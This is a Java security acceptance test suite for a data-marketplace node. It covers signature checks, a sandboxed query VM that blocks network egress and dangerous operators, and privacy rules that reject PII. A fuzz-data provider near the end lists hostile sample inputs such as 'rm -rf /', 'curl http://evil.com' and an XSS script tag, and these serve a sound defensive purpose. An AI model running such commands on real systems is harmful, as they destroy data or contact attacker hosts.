package com.yachaq.api.security;

import com.yachaq.node.contract.ContractDraft;
import com.yachaq.node.contract.ContractDraft.CompensationTerms;
import com.yachaq.node.contract.ContractDraft.IdentityReveal;
import com.yachaq.node.contract.ContractDraft.ObligationTerms;
import com.yachaq.node.contract.ContractSigner;
import com.yachaq.node.inbox.DataRequest.OutputMode;
import com.yachaq.node.key.KeyManagementService;
import com.yachaq.node.odx.ODXBuilder;
import com.yachaq.node.odx.ODXEntry;
import com.yachaq.node.odx.ODXEntry.GeoResolution;
import com.yachaq.node.odx.ODXEntry.ODXSafetyException;
import com.yachaq.node.odx.ODXEntry.Quality;
import com.yachaq.node.odx.ODXEntry.TimeResolution;
import com.yachaq.node.planvm.PlanOperator;
import com.yachaq.node.planvm.PlanValidator;
import com.yachaq.node.planvm.PlanVM;
import com.yachaq.node.planvm.QueryPlan;
import com.yachaq.node.planvm.QueryPlan.PlanStep;
import com.yachaq.node.planvm.QueryPlan.ResourceLimits;
import net.jqwik.api.Arbitraries;
import net.jqwik.api.Arbitrary;
import net.jqwik.api.Property;
import net.jqwik.api.Provide;
import net.jqwik.api.ForAll;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import java.math.BigDecimal;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.PublicKey;
import java.security.SignatureException;
import java.time.Instant;
import java.util.Map;
import java.util.Set;
import java.util.UUID;

import static org.assertj.core.api.Assertions.*;

/**
 * Acceptance Security Gates Verification Tests.
 * 
 * Task 79: Acceptance Security Gates Verification
 * - 79.1 Verify no raw ingestion endpoints (Requirements 338.1) - COMPLETED
 * - 79.2 Verify end-to-end signature validation (Requirements 338.2)
 * - 79.3 Verify PlanVM security (Requirements 338.3)
 * - 79.4 Verify ODX safety (Requirements 338.4)
 * - 79.5 Verify reproducible builds (Requirements 338.5)
 */
class AcceptanceSecurityGatesTest {

    private KeyManagementService keyManagementService;
    private ContractSigner contractSigner;
    private PlanValidator planValidator;
    private PlanVM planVM;
    private ODXBuilder odxBuilder;

    @BeforeEach
    void setUp() {
        keyManagementService = new KeyManagementService();
        contractSigner = new ContractSigner(keyManagementService);
        planValidator = new PlanValidator();
        planVM = new PlanVM();
        odxBuilder = new ODXBuilder();
    }


    // ==================================================================================
    // 79.2 End-to-End Signature Validation - Requirements 338.2
    // Confirm all request/contract/plan/capsule signatures validate
    // ==================================================================================

    @Nested
    @DisplayName("79.2 End-to-End Signature Validation")
    class EndToEndSignatureValidation {

        /**
         * Verify contract signatures validate correctly.
         * **Validates: Requirements 338.2**
         */
        @Test
        @DisplayName("Contract signatures validate correctly")
        void contractSignaturesValidate() throws SignatureException {
            ContractDraft draft = createValidContractDraft();
            
            // Sign the contract
            ContractSigner.SignedContract signed = contractSigner.sign(draft);
            
            // Verify the signature
            ContractSigner.VerificationResult result = contractSigner.verify(signed);
            
            assertThat(result.valid())
                    .as("Valid contract signature should verify")
                    .isTrue();
            assertThat(result.errors()).isEmpty();
        }

        /**
         * Verify tampered contracts are rejected.
         * **Validates: Requirements 338.2**
         */
        @Test
        @DisplayName("Tampered contracts are rejected")
        void tamperedContractsRejected() throws SignatureException {
            ContractDraft draft = createValidContractDraft();
            ContractSigner.SignedContract signed = contractSigner.sign(draft);
            
            // Create a tampered contract with different draft but same signature
            ContractDraft tamperedDraft = new ContractDraft(
                    draft.id(),
                    draft.requestId(),
                    draft.requesterId(),
                    draft.dsNodeId(),
                    Set.of("domain:tampered"), // Changed labels
                    draft.timeWindow(),
                    draft.outputMode(),
                    draft.identityReveal(),
                    draft.compensation(),
                    draft.escrowId(),
                    draft.ttl(),
                    draft.obligations(),
                    draft.nonce(),
                    draft.createdAt(),
                    draft.metadata()
            );
            
            // Create tampered signed contract
            ContractSigner.SignedContract tampered = new ContractSigner.SignedContract(
                    tamperedDraft,
                    signed.dsSignature(),
                    signed.requesterSignature(),
                    signed.dsSignedAt(),
                    signed.requesterSignedAt(),
                    signed.status()
            );
            
            // Verify should fail
            ContractSigner.VerificationResult result = contractSigner.verify(tampered);
            
            assertThat(result.valid())
                    .as("Tampered contract should fail verification")
                    .isFalse();
        }

        /**
         * Property: All valid signatures verify successfully.
         * **Validates: Requirements 338.2**
         */
        @Property(tries = 50)
        void allValidSignaturesVerify(
                @ForAll("validContractDrafts") ContractDraft draft) throws SignatureException {
            
            // Fresh signer for each test
            KeyManagementService kms = new KeyManagementService();
            ContractSigner signer = new ContractSigner(kms);
            
            ContractSigner.SignedContract signed = signer.sign(draft);
            ContractSigner.VerificationResult result = signer.verify(signed);
            
            assertThat(result.valid())
                    .as("Valid signature should verify")
                    .isTrue();
        }

        /**
         * Property: Tampered data always fails verification.
         * **Validates: Requirements 338.2**
         */
        @Property(tries = 50)
        void tamperedDataFailsVerification(
                @ForAll("randomData") byte[] data) {
            
            KeyManagementService kms = new KeyManagementService();
            
            // Sign original data
            byte[] signature = kms.signWithRootKey(data);
            
            // Tamper with data
            byte[] tampered = data.clone();
            if (tampered.length > 0) {
                tampered[0] = (byte) (tampered[0] ^ 0xFF);
            }
            
            // Verification should fail
            boolean valid = kms.verifySignature(
                    tampered,
                    signature,
                    kms.getOrCreateRootKeyPair().getPublic()
            );
            
            assertThat(valid)
                    .as("Tampered data should fail verification")
                    .isFalse();
        }

        /**
         * Verify query plan signatures validate correctly.
         * **Validates: Requirements 338.2**
         */
        @Test
        @DisplayName("Query plan signatures validate correctly")
        void queryPlanSignaturesValidate() {
            QueryPlan plan = createValidQueryPlan();
            
            // Plan should be signed
            assertThat(plan.isSigned())
                    .as("Plan should be signed")
                    .isTrue();
            
            // Validation should pass
            PlanValidator.ValidationResult result = planValidator.validate(plan, null);
            
            // Should not have signature-related errors
            assertThat(result.errors())
                    .as("Signed plan should not have signature errors")
                    .doesNotContain("Plan is not signed");
        }

        /**
         * Verify unsigned plans are rejected.
         * **Validates: Requirements 338.2**
         */
        @Test
        @DisplayName("Unsigned plans are rejected")
        void unsignedPlansRejected() {
            QueryPlan unsignedPlan = QueryPlan.builder()
                    .generateId()
                    .contractId("contract-1")
                    .addStep(new PlanStep(0, PlanOperator.SELECT, Map.of(), Set.of(), Set.of()))
                    .allowedFields(Set.of("domain:activity"))
                    .signature(null)
                    .build();
            
            PlanValidator.ValidationResult result = planValidator.validate(unsignedPlan, null);
            
            assertThat(result.valid())
                    .as("Unsigned plan should be rejected")
                    .isFalse();
            assertThat(result.errors())
                    .contains("Plan is not signed");
        }

        /**
         * Verify expired plans are rejected.
         * **Validates: Requirements 338.2**
         */
        @Test
        @DisplayName("Expired plans are rejected")
        void expiredPlansRejected() {
            QueryPlan expiredPlan = QueryPlan.builder()
                    .generateId()
                    .contractId("contract-1")
                    .addStep(new PlanStep(0, PlanOperator.SELECT, Map.of(), Set.of(), Set.of()))
                    .allowedFields(Set.of("domain:activity"))
                    .signature("valid-signature")
                    .createdAt(Instant.now().minusSeconds(7200))
                    .expiresAt(Instant.now().minusSeconds(3600))
                    .build();
            
            PlanValidator.ValidationResult result = planValidator.validate(expiredPlan, null);
            
            assertThat(result.valid())
                    .as("Expired plan should be rejected")
                    .isFalse();
            assertThat(result.errors())
                    .contains("Plan has expired");
        }
    }


    // ==================================================================================
    // 79.3 PlanVM Security - Requirements 338.3
    // Confirm PlanVM passes fuzzing and cannot make network calls
    // ==================================================================================

    @Nested
    @DisplayName("79.3 PlanVM Security")
    class PlanVMSecurity {

        /**
         * Verify PlanVM blocks network egress.
         * **Validates: Requirements 338.3**
         */
        @Test
        @DisplayName("PlanVM blocks network egress during execution")
        void planVMBlocksNetworkEgress() {
            PlanVM.NetworkGate gate = new PlanVM.NetworkGate();
            PlanVM vm = new PlanVM(new PlanValidator(), gate, new PlanVM.ResourceMonitor());
            
            QueryPlan plan = createValidQueryPlan();
            ContractDraft contract = createValidContractDraft();
            
            // Execute plan
            vm.execute(plan, contract, Map.of("domain:activity", "test"));
            
            // Verify network blocking works
            gate.blockAll();
            assertThatThrownBy(() -> gate.checkEgress("https://malicious.com"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("blocked");
            
            vm.shutdown();
        }

        /**
         * Verify disallowed operators are rejected.
         * **Validates: Requirements 338.3**
         */
        @Test
        @DisplayName("Disallowed operators are rejected")
        void disallowedOperatorsRejected() {
            // EXEC, EVAL, SHELL, NETWORK, FILE_READ, FILE_WRITE should be disallowed
            Set<String> disallowedOps = Set.of(
                    "EXEC", "EVAL", "SHELL", "NETWORK", 
                    "FILE_READ", "FILE_WRITE", "SYSTEM_CALL"
            );
            
            for (String op : disallowedOps) {
                assertThat(PlanOperator.isAllowed(op))
                        .as("Operator '%s' should be disallowed", op)
                        .isFalse();
            }
        }

        /**
         * Verify allowed operators are accepted.
         * **Validates: Requirements 338.3**
         */
        @Test
        @DisplayName("Allowed operators are accepted")
        void allowedOperatorsAccepted() {
            Set<String> allowedOps = Set.of(
                    "SELECT", "FILTER", "PROJECT", "BUCKETIZE",
                    "AGGREGATE", "CLUSTER_REF", "REDACT", "SAMPLE",
                    "EXPORT", "PACK_CAPSULE"
            );
            
            for (String op : allowedOps) {
                assertThat(PlanOperator.isAllowed(op))
                        .as("Operator '%s' should be allowed", op)
                        .isTrue();
            }
        }

        /**
         * Verify excessive resource limits are rejected.
         * **Validates: Requirements 338.3**
         */
        @Test
        @DisplayName("Excessive resource limits are rejected")
        void excessiveResourceLimitsRejected() {
            QueryPlan plan = QueryPlan.builder()
                    .generateId()
                    .contractId("contract-1")
                    .addStep(new PlanStep(0, PlanOperator.SELECT, Map.of(), Set.of(), Set.of()))
                    .allowedFields(Set.of("domain:activity"))
                    .resourceLimits(new ResourceLimits(
                            100000,     // 100 seconds CPU - exceeds 60s limit
                            200000000,  // 200MB memory - exceeds 100MB limit
                            300000,     // 5 minutes execution - exceeds 2 min limit
                            20          // 20% battery - exceeds 10% limit
                    ))
                    .signature("valid-signature")
                    .build();
            
            PlanValidator.ValidationResult result = planValidator.validate(plan, null);
            
            assertThat(result.valid())
                    .as("Plan with excessive resources should be rejected")
                    .isFalse();
        }

        /**
         * Property: Sandbox escape attempts are blocked.
         * **Validates: Requirements 338.3**
         */
        @Property(tries = 30)
        void sandboxEscapeAttemptsBlocked(
                @ForAll("maliciousOperatorParams") Map<String, Object> params) {
            
            PlanVM vm = new PlanVM();
            
            QueryPlan plan = QueryPlan.builder()
                    .generateId()
                    .contractId("contract-1")
                    .addStep(new PlanStep(0, PlanOperator.SELECT, params, Set.of(), Set.of()))
                    .allowedFields(Set.of("domain:activity"))
                    .signature("valid-signature")
                    .build();
            
            ContractDraft contract = createValidContractDraft();
            
            // Execution should not throw unhandled exceptions
            PlanVM.ExecutionResult result = vm.execute(plan, contract, Map.of("domain:activity", "test"));
            
            assertThat(result).isNotNull();
            
            vm.shutdown();
        }
    }


    // ==================================================================================
    // 79.4 ODX Safety - Requirements 338.4
    // Confirm ODX safety scanner shows zero forbidden leaks
    // ==================================================================================

    @Nested
    @DisplayName("79.4 ODX Safety")
    class ODXSafety {

        /**
         * Verify ODX entries reject exact geo resolution.
         * **Validates: Requirements 338.4**
         */
        @Test
        @DisplayName("ODX rejects exact geo resolution")
        void odxRejectsExactGeoResolution() {
            assertThatThrownBy(() -> ODXEntry.builder()
                    .generateId()
                    .facetKey("domain:activity")
                    .timeBucket("2024-01-15")
                    .geoBucket("40.7128,-74.0060")
                    .count(1)
                    .quality(Quality.VERIFIED)
                    .privacyFloor(50)
                    .geoResolution(GeoResolution.EXACT)
                    .timeResolution(TimeResolution.DAY)
                    .ontologyVersion("1.0.0")
                    .build())
                    .isInstanceOf(ODXSafetyException.class)
                    .hasMessageContaining("Exact geo resolution");
        }

        /**
         * Verify ODX entries reject PII patterns.
         * **Validates: Requirements 338.4**
         */
        @Test
        @DisplayName("ODX rejects PII patterns in facet keys")
        void odxRejectsPIIPatterns() {
            Set<String> piiPatterns = Set.of(
                    "email:user@example.com",
                    "phone:+1234567890",
                    "ssn:123-45-6789",
                    "name:John Doe",
                    "address:123 Main St"
            );
            
            for (String pii : piiPatterns) {
                assertThatThrownBy(() -> ODXEntry.builder()
                        .generateId()
                        .facetKey(pii)
                        .timeBucket("2024-01-15")
                        .count(1)
                        .quality(Quality.VERIFIED)
                        .privacyFloor(50)
                        .geoResolution(GeoResolution.NONE)
                        .timeResolution(TimeResolution.DAY)
                        .ontologyVersion("1.0.0")
                        .build())
                        .as("PII pattern '%s' should be rejected", pii)
                        .isInstanceOf(ODXSafetyException.class);
            }
        }

        /**
         * Verify ODX entries accept valid domain labels.
         * **Validates: Requirements 338.4**
         */
        @Test
        @DisplayName("ODX accepts valid domain labels")
        void odxAcceptsValidDomainLabels() {
            Set<String> validLabels = Set.of(
                    "domain:activity",
                    "domain:health",
                    "time:morning",
                    "geo:city",
                    "quality:verified"
            );
            
            for (String label : validLabels) {
                ODXEntry entry = ODXEntry.builder()
                        .generateId()
                        .facetKey(label)
                        .timeBucket("2024-01-15")
                        .count(1)
                        .quality(Quality.VERIFIED)
                        .privacyFloor(50)
                        .geoResolution(GeoResolution.CITY)
                        .timeResolution(TimeResolution.DAY)
                        .ontologyVersion("1.0.0")
                        .build();
                
                assertThat(entry.facetKey())
                        .as("Valid label '%s' should be accepted", label)
                        .isEqualTo(label);
            }
        }

        /**
         * Verify time buckets follow coarse format.
         * **Validates: Requirements 338.4**
         */
        @Test
        @DisplayName("Time buckets follow coarse format")
        void timeBucketsFollowCoarseFormat() {
            // Valid formats: YYYY-WXX (week), YYYY-MM (month), YYYY-MM-DD (day)
            Set<String> validBuckets = Set.of(
                    "2024-W01",
                    "2024-01",
                    "2024-01-15"
            );
            
            for (String bucket : validBuckets) {
                ODXEntry entry = ODXEntry.builder()
                        .generateId()
                        .facetKey("domain:activity")
                        .timeBucket(bucket)
                        .count(1)
                        .quality(Quality.VERIFIED)
                        .privacyFloor(50)
                        .geoResolution(GeoResolution.NONE)
                        .timeResolution(TimeResolution.DAY)
                        .ontologyVersion("1.0.0")
                        .build();
                
                assertThat(entry.timeBucket())
                        .as("Time bucket '%s' should be accepted", bucket)
                        .matches("^\\d{4}(-W\\d{2}|-\\d{2}(-\\d{2})?)?$");
            }
        }

        /**
         * Verify geo buckets don't contain precise coordinates.
         * **Validates: Requirements 338.4**
         */
        @Test
        @DisplayName("Geo buckets don't contain precise coordinates")
        void geoBucketsDontContainPreciseCoordinates() {
            // Valid geo buckets: city names, regions, coarse areas
            Set<String> validGeoBuckets = Set.of(
                    "US-NY",
                    "EU-DE",
                    "APAC-JP",
                    "city:new_york"
            );
            
            for (String geoBucket : validGeoBuckets) {
                ODXEntry entry = ODXEntry.builder()
                        .generateId()
                        .facetKey("domain:activity")
                        .timeBucket("2024-01-15")
                        .geoBucket(geoBucket)
                        .count(1)
                        .quality(Quality.VERIFIED)
                        .privacyFloor(50)
                        .geoResolution(GeoResolution.REGION)
                        .timeResolution(TimeResolution.DAY)
                        .ontologyVersion("1.0.0")
                        .build();
                
                assertThat(entry.geoBucket())
                        .as("Geo bucket should not contain precise coordinates")
                        .doesNotContainPattern("\\d+\\.\\d{3,}");
            }
        }

        /**
         * Property: Forbidden fields never appear in ODX entries.
         * **Validates: Requirements 338.4**
         */
        @Property(tries = 50)
        void forbiddenFieldsNeverAppearInODX(
                @ForAll("safeFacetKeys") String facetKey) {
            
            Set<String> forbiddenPatterns = Set.of(
                    "raw", "payload", "content", "text", "email", "phone",
                    "address", "name", "ssn", "password", "secret", "token",
                    "body", "message", "creditcard", "bankaccount"
            );
            
            String facetLower = facetKey.toLowerCase();
            for (String forbidden : forbiddenPatterns) {
                assertThat(facetLower)
                        .as("ODX facet key must not contain forbidden pattern '%s'", forbidden)
                        .doesNotContain(forbidden);
            }
        }
    }


    // ==================================================================================
    // 79.5 Reproducible Builds - Requirements 338.5
    // Confirm reproducible build verification is documented and repeatable
    // ==================================================================================

    @Nested
    @DisplayName("79.5 Reproducible Builds")
    class ReproducibleBuilds {

        /**
         * Verify build metadata is available.
         * **Validates: Requirements 338.5**
         */
        @Test
        @DisplayName("Build metadata is available")
        void buildMetadataAvailable() {
            // Verify essential build properties exist
            String javaVersion = System.getProperty("java.version");
            String osName = System.getProperty("os.name");
            
            assertThat(javaVersion)
                    .as("Java version should be available")
                    .isNotNull()
                    .isNotEmpty();
            
            assertThat(osName)
                    .as("OS name should be available")
                    .isNotNull()
                    .isNotEmpty();
        }

        /**
         * Verify cryptographic operations are deterministic.
         * **Validates: Requirements 338.5**
         */
        @Test
        @DisplayName("Hash operations are deterministic")
        void hashOperationsAreDeterministic() throws Exception {
            String input = "test-data-for-hashing";
            byte[] inputBytes = input.getBytes(StandardCharsets.UTF_8);
            
            MessageDigest digest1 = MessageDigest.getInstance("SHA-256");
            MessageDigest digest2 = MessageDigest.getInstance("SHA-256");
            
            byte[] hash1 = digest1.digest(inputBytes);
            byte[] hash2 = digest2.digest(inputBytes);
            
            assertThat(hash1)
                    .as("Same input should produce same hash")
                    .isEqualTo(hash2);
        }

        /**
         * Verify signature verification is consistent.
         * **Validates: Requirements 338.5**
         */
        @Test
        @DisplayName("Signature verification is consistent")
        void signatureVerificationConsistent() {
            KeyManagementService kms = new KeyManagementService();
            byte[] data = "test-data".getBytes(StandardCharsets.UTF_8);
            
            byte[] signature = kms.signWithRootKey(data);
            PublicKey publicKey = kms.getOrCreateRootKeyPair().getPublic();
            
            // Verify multiple times
            for (int i = 0; i < 10; i++) {
                boolean valid = kms.verifySignature(data, signature, publicKey);
                assertThat(valid)
                        .as("Signature verification should be consistent (iteration %d)", i)
                        .isTrue();
            }
        }

        /**
         * Verify contract serialization is deterministic.
         * **Validates: Requirements 338.5**
         */
        @Test
        @DisplayName("Contract serialization is deterministic")
        void contractSerializationDeterministic() {
            ContractDraft draft = createValidContractDraft();
            
            byte[] bytes1 = draft.getCanonicalBytes();
            byte[] bytes2 = draft.getCanonicalBytes();
            
            assertThat(bytes1)
                    .as("Contract serialization should be deterministic")
                    .isEqualTo(bytes2);
        }

        /**
         * Verify ODX entry creation is deterministic.
         * **Validates: Requirements 338.5**
         */
        @Test
        @DisplayName("ODX entry creation is deterministic")
        void odxEntryCreationDeterministic() {
            String id = UUID.randomUUID().toString();
            
            ODXEntry entry1 = ODXEntry.builder()
                    .id(id)
                    .facetKey("domain:activity")
                    .timeBucket("2024-01-15")
                    .count(1)
                    .quality(Quality.VERIFIED)
                    .privacyFloor(50)
                    .geoResolution(GeoResolution.NONE)
                    .timeResolution(TimeResolution.DAY)
                    .ontologyVersion("1.0.0")
                    .build();
            
            ODXEntry entry2 = ODXEntry.builder()
                    .id(id)
                    .facetKey("domain:activity")
                    .timeBucket("2024-01-15")
                    .count(1)
                    .quality(Quality.VERIFIED)
                    .privacyFloor(50)
                    .geoResolution(GeoResolution.NONE)
                    .timeResolution(TimeResolution.DAY)
                    .ontologyVersion("1.0.0")
                    .build();
            
            assertThat(entry1.id()).isEqualTo(entry2.id());
            assertThat(entry1.facetKey()).isEqualTo(entry2.facetKey());
            assertThat(entry1.timeBucket()).isEqualTo(entry2.timeBucket());
        }
    }

    // ==================================================================================
    // Helper Methods and Providers
    // ==================================================================================

    private ContractDraft createValidContractDraft() {
        return new ContractDraft(
                UUID.randomUUID().toString(),
                "request-" + UUID.randomUUID(),
                "requester-" + UUID.randomUUID(),
                "ds-node-" + UUID.randomUUID(),
                Set.of("domain:activity", "domain:health"),
                null,
                OutputMode.AGGREGATE_ONLY,
                IdentityReveal.anonymous(),
                CompensationTerms.of(BigDecimal.TEN, "USD"),
                "escrow-" + UUID.randomUUID(),
                Instant.now().plusSeconds(3600),
                ObligationTerms.standard(),
                "nonce-" + UUID.randomUUID(),
                Instant.now(),
                Map.of()
        );
    }

    private QueryPlan createValidQueryPlan() {
        return QueryPlan.builder()
                .generateId()
                .contractId("contract-" + UUID.randomUUID())
                .addStep(new PlanStep(0, PlanOperator.SELECT, Map.of(), Set.of(), Set.of()))
                .allowedFields(Set.of("domain:activity"))
                .resourceLimits(ResourceLimits.defaults())
                .signature("valid-signature-" + UUID.randomUUID())
                .createdAt(Instant.now())
                .expiresAt(Instant.now().plusSeconds(3600))
                .build();
    }

    @Provide
    Arbitrary<ContractDraft> validContractDrafts() {
        return Arbitraries.of(
                createValidContractDraft(),
                new ContractDraft(
                        UUID.randomUUID().toString(),
                        "request-2",
                        "requester-2",
                        "ds-node-2",
                        Set.of("domain:fitness"),
                        null,
                        OutputMode.CLEAN_ROOM,
                        IdentityReveal.anonymous(),
                        CompensationTerms.of(BigDecimal.valueOf(5), "EUR"),
                        "escrow-2",
                        Instant.now().plusSeconds(7200),
                        ObligationTerms.standard(),
                        "nonce-2-" + UUID.randomUUID(),
                        Instant.now(),
                        Map.of()
                )
        );
    }

    @Provide
    Arbitrary<byte[]> randomData() {
        return Arbitraries.bytes()
                .array(byte[].class)
                .ofMinSize(1)
                .ofMaxSize(1000);
    }

    @Provide
    Arbitrary<Map<String, Object>> maliciousOperatorParams() {
        return Arbitraries.of(
                Map.of("exec", "rm -rf /"),
                Map.of("eval", "System.exit(0)"),
                Map.of("shell", "curl http://evil.com"),
                Map.of("code", "Runtime.getRuntime().exec('ls')"),
                Map.of("script", "<script>alert('xss')</script>"),
                Map.of()
        );
    }

    @Provide
    Arbitrary<String> safeFacetKeys() {
        return Arbitraries.of(
                "domain:activity",
                "domain:health",
                "domain:fitness",
                "time:morning",
                "time:evening",
                "geo:city",
                "geo:region",
                "quality:verified",
                "quality:imported"
        );
    }
}
